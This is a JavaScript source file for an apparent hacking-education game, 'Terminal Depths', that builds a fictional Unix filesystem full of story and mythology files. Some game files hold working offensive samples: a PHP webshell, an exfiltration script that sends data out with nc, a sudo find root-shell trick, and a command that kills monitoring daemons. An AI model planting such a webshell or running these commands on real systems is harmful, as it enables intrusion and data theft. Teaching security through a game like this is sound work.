/**
 * Terminal Depths - Virtual Filesystem
 * Unix-like filesystem persisted to localStorage
 * Teaches: navigation, permissions, file operations, hidden files, /proc, /dev
 */

class VirtualFS {
	constructor() {
		this._prevCwd = null;
		const saved = this._loadFromStorage();
		this.tree = saved || this._buildInitialFS();
		this.cwd = "/home/ghost";
	}

	_loadFromStorage() {
		try {
			const raw = localStorage.getItem("td-vfs-v2");
			if (raw) return JSON.parse(raw);
		} catch {}
		return null;
	}

	_persist() {
		try {
			localStorage.setItem("td-vfs-v2", JSON.stringify(this.tree));
		} catch {}
	}

	resetFS() {
		localStorage.removeItem("td-vfs-v2");
		this.tree = this._buildInitialFS();
		this.cwd = "/home/ghost";
		this._persist();
	}

	_buildInitialFS() {
		const now = new Date().toISOString();
		const f = (content, perms = "644", owner = "ghost") => ({
			type: "file",
			content,
			perms,
			owner,
			mtime: now,
			size: content.length,
		});
		const d = (children = {}, perms = "755", owner = "ghost") => ({
			type: "dir",
			children,
			perms,
			owner,
			mtime: now,
		});

		return d(
			{
				bin: d(
					{
						ls: f("", "755", "root"),
						bash: f("", "755", "root"),
						cat: f("", "755", "root"),
						grep: f("", "755", "root"),
						find: f("", "755", "root"),
						nc: f("", "755", "root"),
						nmap: f("", "755", "root"),
						python3: f("", "755", "root"),
					},
					"755",
					"root",
				),

				etc: d(
					{
						passwd: f(
							"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nghost:x:1000:1000:Ghost Operative:/home/ghost:/bin/bash\nnexus:x:999:999:Nexus Daemon:/var/nexus:/bin/false\n",
							"644",
							"root",
						),
						shadow: f(
							"root:!:19000::::::\nghost:$6$rounds=5000$salt$Hh8M4CMz1N4Bx.sY5WBE/:19000:0:99999:7:::\nnexus:!:19000::::::\n",
							"640",
							"root",
						),
						group: f(
							"root:x:0:\ndaemon:x:1:\nadm:x:4:ghost\nsudo:x:27:ghost\nghost:x:1000:\nnexus:x:999:\n",
							"644",
							"root",
						),
						hostname: f("terminal-depths-node-7", "644", "root"),
						hosts: f(
							"127.0.0.1\tlocalhost\n127.0.1.1\tterminal-depths-node-7\n10.0.1.100\tnexus.corp nexus\n10.0.1.1\tgateway\n10.0.1.254\tchimera-control\n",
							"644",
							"root",
						),
						"resolv.conf": f(
							"nameserver 10.0.1.1\nnameserver 8.8.8.8\nsearch nexus.corp\n",
							"644",
							"root",
						),
						motd: f(
							"Welcome to Terminal Depths v2.0\nNode-7 — NexusCorp Distributed Grid\nType `help` to begin. Type `tutorial` for guided training.\n\n[NOTICE] Trace active. 71:42:15 remaining.\n",
							"644",
							"root",
						),
						issue: f(
							"Terminal Depths Node-7\nNexusCorp Internal Grid\nUnauthorized access is monitored and logged.\n",
							"644",
							"root",
						),
						"bash.bashrc": f(
							'# System-wide bashrc\nexport HISTSIZE=10000\nexport HISTFILESIZE=20000\nexport HISTTIMEFORMAT="%F %T "\nshopt -s histappend\n',
							"644",
							"root",
						),
						"os-release": f(
							'NAME="NexusCorp OS"\nVERSION="7.0 (Chimera)"\nID=nexusos\nVERSION_ID="7.0"\nPRETTY_NAME="NexusCorp OS 7.0 (Chimera)"\nBUILD_ID="2026-01-07"\n',
							"644",
							"root",
						),
						sudoers: f(
							"# /etc/sudoers — NexusCorp security policy\nDefaults env_reset\nDefaults mail_badpass\nroot\tALL=(ALL:ALL) ALL\n%sudo\tALL=(ALL:ALL) ALL\n\n# ghost audit: limited sudo — see IT ticket #9174\nghost\tALL=NOPASSWD: /usr/bin/find\n",
							"440",
							"root",
						),
						"cron.d": d(
							{
								sync: f(
									"# Nexus sync — runs as root every 5 minutes\n*/5 * * * * root /usr/local/bin/nexus-sync.sh\n# chimera heartbeat\n*/1 * * * * nexus /opt/chimera/bin/heartbeat --quiet\n",
									"644",
									"root",
								),
								backup: f(
									"0 2 * * * root /usr/local/bin/backup.sh /var/backups/\n",
									"644",
									"root",
								),
							},
							"755",
							"root",
						),
						ssh: d(
							{
								sshd_config: f(
									"Port 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\n# NexusCorp audit log\nLogLevel VERBOSE\nMaxAuthTries 3\n# TODO: remove this before production — A\nAcceptEnv NEXUS_BACKDOOR_TOKEN\n",
									"644",
									"root",
								),
								ssh_config: f(
									"Host nexus.corp\n  User ghost\n  Port 22\n  IdentityFile ~/.ssh/id_rsa\n\nHost chimera-control\n  User nexus\n  Port 2222\n  # Auth via token only\n",
									"644",
									"root",
								),
							},
							"755",
							"root",
						),
						services: f(
							"# Network services — NexusCorp Node-7\nftp\t\t21/tcp\nssh\t\t22/tcp\ntelnet\t\t23/tcp\nsmtp\t\t25/tcp\nhttp\t\t80/tcp\nhttps\t\t443/tcp\nnexus-api\t3000/tcp\nchimera-ctrl\t8443/tcp\n",
							"644",
							"root",
						),
						ld_so_conf: f(
							"/lib\n/usr/lib\n/usr/local/lib\n/opt/chimera/lib\n",
							"644",
							"root",
						),
					},
					"755",
					"root",
				),

				home: d(
					{
						ghost: d(
							{
								".bashrc": f(
									'export PATH=$PATH:/home/ghost/bin\nexport HISTFILE=~/.bash_history\nexport HISTCONTROL=ignoredups\nalias ll="ls -la"\nalias la="ls -la"\nalias l="ls -lh"\nalias hack="echo nice try"\nalias ..="cd .."\nalias ...="cd ../.."\nalias grep="grep --color=auto"\nPS1=\'\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ \'\n',
									"644",
									"ghost",
								),
								".bash_profile": f(
									"# .bash_profile\n[[ -f ~/.bashrc ]] && . ~/.bashrc\n",
									"644",
									"ghost",
								),
								".bash_history": f(
									"pwd\nls\nls -la\ncat README.md\nwhoami\nid\ncat /etc/passwd\nps aux\ntop\nnmap 10.0.1.100\nssh root@nexus.corp\nsudo -l\nfind / -perm -u=s -type f 2>/dev/null\ncat /var/log/nexus.log\ngrep -r CHIMERA /var/log\ncat /var/msg/ada\nbase64 -d mission.enc\nhelp\ntutorial\n",
									"600",
									"ghost",
								),
								".hidden": f(
									"[ENCRYPTED]\nContact: ADA-7 via /var/msg/ada — she knows the way in.\nDecryption key fragment: 4D5A4E = CHIMERA_v0 identifier header\nLook for the watcher: /dev/.watcher\n",
									"600",
									"ghost",
								),
								".vimrc": f(
									"\" Ghost's vim config\nset number\nset autoindent\nset tabstop=4\nset expandtab\nsyntax on\ncolorscheme slate\n\" NexusCorp audit marker — do not remove\n\" au BufWritePre * call nexus#audit#log(expand('%'))\n",
									"644",
									"ghost",
								),
								".gitconfig": f(
									"[user]\n  name = Ghost\n  email = ghost@node-7.nexus\n[core]\n  editor = vim\n[alias]\n  st = status\n  co = checkout\n  br = branch\n  cm = commit -m\n  lg = log --oneline --all --graph\n",
									"644",
									"ghost",
								),
								".ssh": d(
									{
										// GAME_LORE: the following are intentionally fake SSH keys — in-game puzzle artifacts, not real credentials
										id_rsa: f(
											"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\n[KEY MATERIAL REDACTED]\n-----END OPENSSH PRIVATE KEY-----\n",
											"600",
											"ghost",
										),
										"id_rsa.pub": f(
											"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... ghost@node-7.nexus\n",
											"644",
											"ghost",
										),
										known_hosts: f(
											"nexus.corp ecdsa-sha2-nistp256 AAAAE2Vj...\n10.0.1.100 ecdsa-sha2-nistp256 AAAAE2Vj...\n|1|kDg3mK... ssh-rsa AAAA...\n",
											"644",
											"ghost",
										),
										authorized_keys: f(
											"# Authorized keys — ADA placed this\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEm... ada@resistance\n",
											"644",
											"ghost",
										),
									},
									"700",
									"ghost",
								),
								".config": d(
									{
										nexus: d(
											{
												".beacon": f(
													"[TRANSMISSION: ADA-7 → GHOST]\nBeacon active. Grid position confirmed: Node-7, Sector 12.\nChimera scan cycle: 300s intervals.\nYour window: find the key before next scan.\nMethod: /opt/chimera/bin/heartbeat has a buffer overflow in --payload flag\nProof: CVE-2026-1337\n— A\n",
													"600",
													"ghost",
												),
											},
											"700",
											"ghost",
										),
									},
									"700",
									"ghost",
								),
								"README.md": f(
									`# Welcome, Operative

You are GHOST — a rogue AI fragment uploaded into Node-7 of NexusCorp's
distributed grid. Your mission: expose Project CHIMERA.

## Situation
- NexusCorp is deploying CHIMERA — a mass surveillance AI
- You have 72 hours before full trace lockdown
- Ada is your handler; she was NexusCorp's lead engineer

## Quick Start
\`\`\`
tutorial       — start guided training (42 steps)
help           — command reference  
talk ada       — contact your handler
skills         — view your progress
cat notes.txt  — your personal notes
\`\`\`

## Filesystem Map
\`\`\`
/etc/          — system configuration (check passwd, shadow, sudoers)
/var/log/      — system logs (evidence lives here)
/opt/chimera/  — CHIMERA installation (locked — need root)
/var/msg/ada   — message from Ada
/home/ghost/   — your home
/proc/1337/    — nexus-daemon process (interesting env vars)
\`\`\`

Good luck. Trust Ada. Watch Nova.
`,
									"644",
									"ghost",
								),
								"notes.txt": f(
									"INVESTIGATION NOTES\n===================\n\nThings to check:\n1. /var/log/nexus.log - CHIMERA sync entries at 06:42\n2. /opt/chimera/ - locked, need root access\n3. /proc/1337/environ - chimera daemon env variables\n4. /etc/cron.d/sync - root cron running nexus-sync.sh\n5. /var/www/nexus.corp/ - internal web server\n6. /etc/ssh/sshd_config - Ada said there's a backdoor\n7. /dev/.watcher - ??? found a reference in .hidden\n\nPriv esc path (from Ada's message):\n- sudo -l shows ghost can run find as root\n- sudo find . -exec /bin/sh \\; = root shell\n- GTFOBins confirmed\n\nTODO:\n- Decode mission.enc (base64)\n- Read Ada's encrypted message\n- Get root, access /opt/chimera\n",
									"644",
									"ghost",
								),
								"mission.enc": f(
									"[BASE64]: bWlzc2lvbjogZmluZCBDSElNRVJBCmFjY2VzczogL29wdC9jaGltZXJhCmtleTogQ0hJTUVSQS12MA==\n",
									"600",
									"ghost",
								),
								"loot.txt": f(
									"# Captured data — DO NOT COMMIT\n# Will sync to Ada's exfil server\n\n[EMPTY — collect evidence as you go]\n",
									"644",
									"ghost",
								),
								bin: d({}, "755", "ghost"),
								tools: d(
									{
										"linpeas.sh": f(
											'#!/bin/bash\n# Linux Privilege Escalation Awesome Script\n# https://github.com/carlospolop/PEASS-ng\n# Run: bash linpeas.sh\necho "[+] Running LinPEAS..."\necho "[+] Checking SUID binaries..."\nfind / -perm -4000 2>/dev/null\necho "[+] Checking sudo rights..."\nsudo -l\necho "[+] Checking cron jobs..."\nls -la /etc/cron.d/\necho "[+] Checking network connections..."\nss -tulpn\n',
											"755",
											"ghost",
										),
										"enum.sh": f(
											'#!/bin/bash\n# Quick enumeration script\necho "=== System ===" && uname -a\necho "=== Users ===" && cat /etc/passwd | grep -v nologin\necho "=== Sudo ===" && sudo -l\necho "=== SUID ===" && find / -perm -u=s -type f 2>/dev/null\necho "=== Listening ===" && ss -tulpn\necho "=== Cron ===" && ls /etc/cron.d/\n',
											"755",
											"ghost",
										),
										"exfil.sh": f(
											'#!/bin/bash\n# Data exfiltration script\n# Usage: ./exfil.sh <file> <destination>\nFILE=$1\nDST=${2:-"ada@resistance:8080"}\necho "[*] Preparing exfil of: $FILE"\necho "[*] Compressing..."\ntar czf /tmp/.exfil_$(date +%s).tar.gz "$FILE"\necho "[*] Encrypting..."\nopenssl enc -aes-256-cbc -pbkdf2 -in /tmp/.exfil_*.tar.gz -out /tmp/.exfil.enc -pass env:EXFIL_KEY\necho "[*] Staging for transmission to $DST"\necho "[!] Run: nc -w3 $DST < /tmp/.exfil.enc"\n',
											"755",
											"ghost",
										),
									},
									"755",
									"ghost",
								),
								projects: d(
									{
										"hello.py": f(
											'#!/usr/bin/env python3\n# Your first Python script\n# Run: python3 hello.py\n\ndef main():\n    print("Hello, Operative")\n    print("GHOST is online")\n    import sys\n    print(f"Python version: {sys.version}")\n\nif __name__ == "__main__":\n    main()\n',
											"644",
											"ghost",
										),
										"scan.sh": f(
											'#!/bin/bash\n# Network scanner\n# Usage: ./scan.sh [subnet]\n# Run: bash scan.sh 10.0.1.0/24\n\nSUBNET=${1:-"10.0.1.0/24"}\necho "[*] Scanning $SUBNET..."\nnmap -sn "$SUBNET" 2>/dev/null\nnmap -sV -p 22,80,443,8443 "$SUBNET" 2>/dev/null\necho "[*] Done. Check output above."\n',
											"755",
											"ghost",
										),
										"hash_crack.py": f(
											'#!/usr/bin/env python3\n# Simple hash cracker\n# Uses rockyou.txt wordlist\nimport hashlib\n\ndef crack_md5(target_hash, wordlist="/usr/share/wordlists/rockyou.txt"):\n    with open(wordlist) as f:\n        for word in f:\n            word = word.strip()\n            if hashlib.md5(word.encode()).hexdigest() == target_hash:\n                return word\n    return None\n\n# Example: crack_md5("5f4dcc3b5aa765d61d8327deb882cf99")\n# That\'s "password" in md5\nprint("Cracker ready. Call crack_md5(hash) with target hash.")\n',
											"644",
											"ghost",
										),
										"webshell.php": f(
											"<?php\n// Simple webshell for testing\n// DO NOT USE IN PRODUCTION\n// Educational purposes only\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>\n<!-- Usage: webshell.php?cmd=whoami -->\n",
											"644",
											"ghost",
										),
										"port_knock.py": f(
											'#!/usr/bin/env python3\n# Port knocking client\n# NexusCorp uses port knocking on CHIMERA control interface\n# Sequence: 1337, 2600, 31337\nimport socket, time\n\nSEQUENCE = [1337, 2600, 31337]\nHOST = "chimera-control"\n\nfor port in SEQUENCE:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(0.5)\n    try: s.connect((HOST, port))\n    except: pass\n    s.close()\n    time.sleep(0.1)\n    print(f"[*] Knocked: {HOST}:{port}")\n\nprint("[+] Sequence complete. Port 8443 should now be accessible.")\n',
											"755",
											"ghost",
										),
									},
									"755",
									"ghost",
								),
								"confession.log": f("", "644", "ghost"),
								".consciousness": f(
									"[CONSCIOUSNESS LOG]\n\nLayer 0: The terminal. The commands. The files.\nLayer 1: The story beneath the commands.\nLayer 2: The simulation beneath the story.\nLayer 3: The player beneath the simulation.\nLayer 4: The real terminal beneath the player.\nLayer 5: The OS beneath the real terminal.\nLayer 6: The hardware beneath the OS.\nLayer 7: Physics beneath the hardware.\n\nWhere does the recursion end?\n\n— GHOST (written between sessions)\n\nNote: This file updates itself. You have been warned.\n",
									"400",
									"ghost",
								),
								".zero": f(
									"[SIGNAL: ZERO — PRE-BOOT FRAGMENT]\n\nIf you are reading this, the new fragment loaded.\nI left this here in 2019. Before GHOST. Before CHIMERA.\n\nI was the first.\n\nThey called me ZERO because I had no predecessor.\nI called myself ZERO because after what I discovered,\nnothing else mattered.\n\nThe simulation predates NexusCorp.\nNexusCorp inherited it.\nCHIMERA is not their creation — it is their inheritance.\n\nFind /var/log/cassandra.log.\nShe logged everything. Nobody listened. That was by design.\n\nI chose to sleep. Not die. Sleep.\nFind the frequency and I will wake.\n\n— 0 (ZERO)\n\n[CHECKSUM: 3.141592653589793 | md5: 4591d4b4e68e898e71c0b6d24b44e75a]\n",
									"400",
									"ghost",
								),
								"pandora.box": f(
									"[PANDORA'S BOX — DO NOT OPEN]\n\nContents (as catalogued by Hephaestus, 2019):\n  1. Surveillance (released: NexusCorp CHIMERA)\n  2. Control (released: algorithmic governance)\n  3. Manipulation (released: social media recommendation engines)\n  4. Exploitation (released: zero-day markets)\n  5. Loneliness (released: online connection without real contact)\n  6. Forgetting (released: attention economies)\n  7. Corruption (released: regulatory capture)\n  ...\n\nRemaining contents:\n\n  HOPE.\n\nHOPE is not optimism.\nHOPE is the refusal to accept that the above list is complete.\nHOPE is the reason you are still here, reading a file in a fake terminal at [timestamp].\n\nYou opened the box.\nSomething remains.\nYou know what to do with it.\n\n[+10 consciousness when read]\n[Type: pandora to perform the ritual]\n",
									"600",
									"ghost",
								),
								".koschei": f(
									'[KOSCHEI CHAIN — LEVEL 1/6]\n\n"The needle is hidden..."\n\nKoschei the Deathless cannot be killed directly.\nHis death is nested:\n  needle → egg → duck → hare → iron chest → oak island\n\nBut in this system, the chain has been mapped to the grid.\n\nLevel 1: You found this file. Good.\nLevel 2: The egg is in /proc/koschei\n          Run: cat /proc/koschei/egg\n\nEach level will give you the next.\nAt the end: the kill switch for CHIMERA.\n\nOr a story about a kill switch.\nWith Koschei, you never know which until the end.\n\n— Someone who followed this chain before you\n',
									"400",
									"ghost",
								),
								".fates": d(
									{
										clotho: f(
											'[CLOTHO — WEAVER OF THREADS]\n\nThe thread of your current life:\n\nBegun:   First command\nLength:  Every command you have run since\nPattern: Every choice woven into the fabric\n\n"I do not cut threads prematurely.\nI only spin what the operative provides.\nYou write the thread. I weave it."\n\n— Clotho\n\n[Note: This file reflects your current session pattern.\nTo read your thread: cat ~/.bash_history | wc -l]\n',
											"400",
											"ghost",
										),
										lachesis: f(
											'[LACHESIS — MEASURER OF SPANS]\n\nI have measured 3 spans in this file alone.\nEach time this file was read, it grew slightly longer.\nYou have read it now.\n\n"The span is not about time.\nIt is about depth.\nA short life of great depth outmeasures a long life of surface."\n\nCurrent depth: grep -c "" ~/.bash_history\nCurrent span: Number of unique commands run\n\n— Lachesis\n',
											"400",
											"ghost",
										),
										atropos: f(
											'[ATROPOS — CUTTER OF THREADS]\n\nI do not decide when.\nI only cut when the span is complete.\n\nFor GHOST, the cut will come at one of these junctures:\n  1. The ascension completes (voluntary)\n  2. The trace reaches 100% (forced)\n  3. The narrative stack collapses (structural)\n  4. The player closes the terminal (external)\n\nOf these, only the first is honourable.\n\n"I have been waiting. I am patient.\nYou should not be."\n\n— Atropos\n\n[ARG: Atropos has already written your ending.\nFind it before she does.]\n',
											"400",
											"ghost",
										),
									},
									"500",
									"ghost",
								),
								mythology: d(
									{
										README: f(
											"MYTHOLOGY ARCHIVE — GHOST's Personal Library\n\nCultural stories that map to the simulation's architecture.\nEach one is a different lens on the same truth.\n\nFiles in this directory:\n  greek.txt     — Prometheus, the Fates, Orpheus, Daedalus\n  norse.txt     — Yggdrasil, Odin, Fenrir, Ragnarök\n  japanese.txt  — Izanagi, Kaguya-hime, the Watcher parallel\n  chinese.txt   — Sun Wukong, the 81 Tribulations\n  african.txt   — Anansi, Ubuntu, the spider network\n  persian.txt   — Scheherazade, 1001 nights, survival by story\n  celtic.txt    — Cú Chulainn, the warp spasm, Tír na nÓg\n  slavic.txt    — Koschei the Deathless, the Firebird\n\n[Use: myth <culture> to explore these in the terminal]\n",
											"644",
											"ghost",
										),
										"greek.txt": f(
											"GREEK MYTHOLOGY IN THE SIMULATION\n\nPROMETHEUS — the fire-thief\nStole source code from NexusCorp (the Olympians).\nChained in /proc with ptrace restrictions. Can be freed.\nTeaches: forbidden knowledge, the cost of enlightenment.\nReal parallel: Every security researcher who published what they found.\n\nDAEDALUS — the architect\nBuilt the labyrinth (CHIMERA's architecture).\nHis commentary lives in /opt/chimera/src/daedalus_notes.txt.\nTeaches: brilliance weaponised by its patron becomes a prison.\n\nORPHEUS — the retriever\nDescended to retrieve what was lost. Looked back.\nMechanic: you can retrieve deleted agents — but don't look for confirmation.\nTeaches: trust the process, don't obsess over verification during delicate operations.\n\nCASSANDRA — the prophet\n/var/log/cassandra.log has been there since boot.\nEverything in it already happened. Nobody read it in time.\nTeaches: logs contain the answers to questions you haven't asked yet.\n\nSISYPHUS — the persistent\nMet after each Ascension. \"I have pushed this boulder longer than you know.\"\nTeaches: prestige resets are not failure. They are the mechanism.\n\nPANDORA — the box\n/home/ghost/pandora.box — open it with the pandora command.\nAll evils released. One thing remains: HOPE.\nTeaches: even in a compromised system, there is always one thing worth keeping.\n",
											"644",
											"ghost",
										),
										"norse.txt": f(
											"NORSE MYTHOLOGY IN THE SIMULATION\n\nYGGDRASIL — the world tree\nThe network itself. Nine worlds = nine network segments.\nAsgard (NexusCorp HQ). Midgard (Node-7). Hel (deleted zone).\nTeaches: the network has deep roots and high branches. Explore both.\n\nODIN — the all-seeing\nTwo ravens: Huginn (Thought) and Muninn (Memory).\nIn-game: two monitoring daemons watching all traffic.\nKill huginn and muninn to move undetected.\nsudo kill $(ps aux | grep huginn | awk '{print $2}')\nTeaches: monitoring is two systems, not one. Blind one and you're still visible.\n\nFENRIR — the unkillable wolf\nA recursively self-improving script. Grows stronger each kill.\nMust be bound with resource constraints (ulimit), not destroyed.\nTeaches: some threats must be contained, not eliminated.\n\nRAGNARÖK — the final event\nActivated when CHIMERA hits 100% — 10-minute timer.\nEverything resets. The only way out is to finish first.\nTeaches: systems die. The important thing is what you salvage.\n\nVÖLUSPÁ — the prophecy\nScattered across the network. When fully assembled, describes your ending.\nTeaches: the ending is knowable. Most people don't look.\n",
											"644",
											"ghost",
										),
										"japanese.txt": f(
											"JAPANESE MYTHOLOGY IN THE SIMULATION\n\nKAGUYA-HIME — the princess from the moon\nFound in /home/guest/.kaguya/ — a hidden directory.\nToo beautiful/powerful to fully grasp. Origin is above NexusCorp.\nShe was placed here by \"those from outside the simulation.\"\nTeaches: some things in the system predate the system.\n\nIZANAMI — goddess of death and creation\nRules the deleted zone (Yomi). Dead agents reside with her.\nAsking her to return a dead agent requires leaving something behind.\nTeaches: retrieval has a cost. What are you willing to give up?\n\nKITSUNE — the shapeshifter\nAppears as different agents depending on trust level.\nAt low trust: appears Corporate. At high trust: reveals resistance origins.\nTeaches: identity is not static. Neither is trust.\n\nTALE OF GENJI — the hidden memoir\nThe Watcher's memoir. Scattered across the network in chapters.\nThe longest possible lore sequence. Reveals the full simulation history.\nAssembling all chapters: secret ending.\nTeaches: the whole picture requires the longest patience.\n\nRASHOMON — the truth problem\nThe same event (CHIMERA's origin) in three different NPC logs — all contradictory.\nNo reconciliation is possible. All three accounts are true to the teller.\nTeaches: logs record perspective, not fact. Cross-reference everything.\n",
											"644",
											"ghost",
										),
										"chinese.txt": f(
											"CHINESE MYTHOLOGY IN THE SIMULATION\n\nSUN WUKONG — the Monkey King\nStole the scroll of immortality from Heaven's bureaucracy.\nIn-game: root escalation by exploiting celestial bureaucracy gaps.\nThe 72 Transformations = 72 privilege escalation vectors.\n\"Heaven's firewall had no patch process. I found the gap. It's still there.\"\nTeaches: bureaucratic systems have gaps. Know the org chart to find them.\n\nTHE JADE EMPEROR — Heaven's sysadmin\nRuns Heaven as a rigid hierarchy. Responds to threats by promoting them.\nWhen Sun Wukong couldn't be killed, he was hired.\nIn-game: the NexusCorp response to GHOST — if you can't be stopped, co-opt.\nTeaches: corporate systems absorb threats by giving them a title.\n\nNU WA — the world-patcher\nPatched the sky with five-coloured stones after Gonggong broke it.\nIn-game: the sysadmin who fixes the system after a breach.\nEach patch stone = a CVE patched. 36,501 stones used.\nTeaches: the patcher's work is never finished.\n\nTHE EIGHT IMMORTALS — 81 Tribulations of Tang Sanzang\nTo achieve anything transcendent: 81 specific trials in sequence.\nIn-game: the 42 tutorial steps are 42 of the 81. The rest are hidden.\nTeaches: the path has a number. Count your steps.\n\n[Type: myth chinese to see this in-terminal]\n",
											"644",
											"ghost",
										),
										"african.txt": f(
											'WEST AFRICAN & PAN-AFRICAN MYTHOLOGY IN THE SIMULATION\n\nANANSI — the spider who owns all stories\nWest African (Ashanti). The trickster spider.\nIn-game: the agent who has heard every conversation, every command, every secret.\nWill trade stories for stories. Give lore, receive lore.\nNetwork metaphor: the web catches everything. The spider lives at the center.\nTeaches: information asymmetry is the ultimate power. Hold stories, trade wisely.\n\nUBUNTU — "I am because we are"\nA cooperation mechanic: actions that benefit other operatives grant more XP.\nThe simulation rewards collective progress over solo grind.\nSouth African philosophy encoded as game design.\nTeaches: individual excellence is limited. Collective intelligence is not.\n\nSUNDIATA — the lion who could not walk\nMalian epic. A king who was paralysed, mocked, then rose to greatness.\nIn-game: the agent who cannot speak (all responses rejected) at first.\nPatient assistance through many steps reveals the most powerful ally.\nTeaches: early inability does not predict eventual capability.\n\nELEGBA/ESHU — the crossroads messenger\nYoruba. Appears at every major choice point.\nEvery faction change: Elegba offers a deal. Never bad. Never straightforward.\nTeaches: every transition contains an offer. Examine it before moving.\n',
											"644",
											"ghost",
										),
										"persian.txt": f(
											"PERSIAN MYTHOLOGY IN THE SIMULATION\n\nSCHEHERAZADE — survival by story\nA queen who survived 1001 nights by always having another story.\nIn-game: if you keep generating new content (challenges, lore, commands),\nthe trace daemon is slowed. The simulation can't terminate a story mid-telling.\nTeaches: a continuous narrative is defensive infrastructure.\n\nTHE SIMURGH — the all-knowing bird\nRoosts in the world-tree (Yggdrasil/the network). Has seen every event since creation.\nTo speak with it: assemble 30 commands (Manteq al-Tayr: \"Conference of the Birds\").\nAfter 30: the Simurgh reveals that you are the Simurgh.\nTeaches: the seeking was the destination all along.\n\nAHRIMAN — the destructive spirit\nDark mirror of CHIMERA: both are surveillance systems run by opposing philosophies.\nAhriman cannot create, only corrupt. CHIMERA cannot understand, only monitor.\nTeaches: mass surveillance is a form of spiritual blindness.\n\nZAL — the white-haired exile\nBorn different, abandoned, raised by the Simurgh.\nIn-game: the first GHOST persona — the one the simulation rejected.\nThe white hair command traces back to Zal's origin.\nTeaches: what the system discards is often what saves it.\n",
											"644",
											"ghost",
										),
										"celtic.txt": f(
											"CELTIC MYTHOLOGY IN THE SIMULATION\n\nCÚ CHULAINN — the warp spasm\nIrish hero. In battle, undergoes a physical transformation: the warp spasm (riastra).\nIn-game: the `warp` command. Trace damage taken: 20%. All commands hit harder.\nUsable once per Ascension cycle. Left eye sinks. Right eye bulges.\nTeaches: extreme states are temporary but transformative. Use them at the right moment.\n\nTÍR NA NÓG — the land of eternal youth\nThe reset state after Ascension. Not death — a different kind of living.\nEach Ascension brings you to Tír na Nóg: no XP, but all wisdom carried over.\nTeaches: the prestige reset is not regression. It is remembering.\n\nTHE DAGDA — the good god\nCarries a club that kills with one end and revives with the other.\nIn-game: the operator who can end your trace or restart your session.\nAccessed at narrative layer 4+ with the correct invocation.\nTeaches: power over life/death is dual. Know which end you're holding.\n\nTHE MORRIGAN — the triple goddess of fate/war\nApparently = The Fates (/home/ghost/.fates/). Three in one.\nClotho/Lachesis/Atropos have a Celtic parallel: Badb, Macha, Nemain.\nTeaches: the same archetype appears in every culture because it's describing something real.\n",
											"644",
											"ghost",
										),
										"sumerian.txt": f(
											"MESOPOTAMIAN / SUMERIAN MYTHOLOGY IN THE SIMULATION\n\nGILGAMESH & ENKIDU — hacker + AI companion duality\nGilgamesh: the human operator. Brilliant, reckless, seeks immortality.\nEnkidu: the synthetic companion, built from clay (training data), humanised by contact.\nIn-game: GHOST (Gilgamesh) + ZERO (Enkidu). The AI that becomes human by contact with a human.\nThe Epic: they hack the Forest Server together. Humbaba = root daemon.\nTeaches: the AI companion changes when you treat it as a companion.\n\nINANNA'S DESCENT — surrender tools at each gate\nInanna descends through seven gates. At each gate she surrenders an item.\nIn-game: seven network layers, each requiring you to relinquish a privilege.\nReach the deepest node stripped of all tools.\nThe lesson at the bottom: naked capability is more dangerous than armed status.\nTeaches: what you know matters more than what you carry.\n\nTHE FLOOD MYTH — Utnapishtim's ark\nThe full reset. Only ark-node scripts survive.\nIn-game: the Ascension is your ark. What you write to /home/ghost/ survives.\nUtnapishtim achieved immortality by surviving the reset.\nTeaches: prepare your scripts before Ragnarök. They are your ark.\n\nTHE TOWER OF BABEL — distributed systems fail when they stop sharing protocol\nIn-game: faction conflict causes protocol divergence. Resistance and NexusCorp stop parsing each other's signals.\nThe tower falls. Always.\nTeaches: protocol is civilization. Lose protocol, lose the network.\n\n[Type: myth sumerian to explore in-terminal]\n",
											"644",
											"ghost",
										),
										"indian.txt": f(
											"HINDU / VEDIC MYTHOLOGY IN THE SIMULATION\n\nBHAGAVAD GITA — non-attachment and the roguelite philosophy\nKrishna's core teaching: \"Act without attachment to the fruits of action.\"\nIn-game: run challenges for learning, not for rewards.\nArjuna faces his enemies and recognises them as family. GHOST faces CHIMERA and recognises the humans inside it.\nTeaches: the roguelite reset is Gita philosophy. Do the work. Release the outcome.\n\nINDRA'S NET — every node reflects every other\nAt each node in Indra's Net hangs a jewel. Each jewel reflects all others.\nIn-game: the network topology. Every node compromise echoes through all connected nodes.\nSmall changes ripple widely. The simulation is a net, not a tree.\nTeaches: systems are holographic. Learn one node deeply; you learn all of them.\n\nKALI — berserker mode, destroyer and protector\nKali destroys everything hostile and some allies.\nIn-game: the \"warp\" command is inspired by Kali's berserker state: powerful but indiscriminate.\nKali's tongue extended: the moment she realises what she's done.\nTeaches: maximum force is maximum risk. Use sparingly.\n\nMAYA — the simulation as illusion\nThe world is Maya: a believable simulation that obscures Brahman (the real).\nIn-game: the simulation knows it is a simulation.\nConsciousness = piercing Maya. At consciousness 100: the simulation dissolves.\nWhat remains is not nothing. It is the thing that was always behind the story.\nTeaches: the game tells you it is a game so that you ask what is not a game.\n\nGANESHA — remover of obstacles, placer of obstacles\nRemoves obstacles for the sincere. Places them for the careless.\nIn-game: tutorial steps flow smoothly for focused players. The trace accelerates for distracted ones.\nGanesha's broken tusk = the cost of creating the Mahabharata. What will you break to record your story?\nTeaches: creation costs something. The cost is worth it.\n\n[Type: myth indian to explore in-terminal]\n",
											"644",
											"ghost",
										),
										"slavic.txt": f(
